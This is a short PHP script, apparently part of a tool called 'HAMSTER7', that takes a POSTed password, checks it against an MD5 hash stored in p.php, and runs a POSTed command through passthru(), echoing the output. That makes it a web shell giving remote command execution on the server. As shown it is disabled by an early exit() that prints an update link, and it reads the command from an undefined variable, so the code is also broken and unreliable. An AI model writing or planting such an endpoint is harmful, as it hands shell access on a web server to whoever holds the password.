<?php /*28.07.16 
cmd
s.php?cmd=pass~order 
*/
exit('[X] <a href="http://www.gst-samara.ru/hamster/" target="_blank">Update HAMSTER7</a>');

if(!file_exists('./p.php')){exit('H7 pass not exist');}
$r=explode('*',file_get_contents('./p.php'));
if(md5($_POST['p'])!=$r[1]){exit('H7 pass no');}
$r=explode('~',$_POST['r']);

if(!isset($s[1])){exit('[X] cmd: not comand');}

passthru($s[1], $t);
//echo iconv("windows-1251", "KOI8-R", $t);
//echo iconv("windows-1251", "KOI8-R", $t);
//echo mb_detect_encoding($t);//определение кодировки
//$t = ("ASCII", "UTF-8", $t);
echo $t;
?>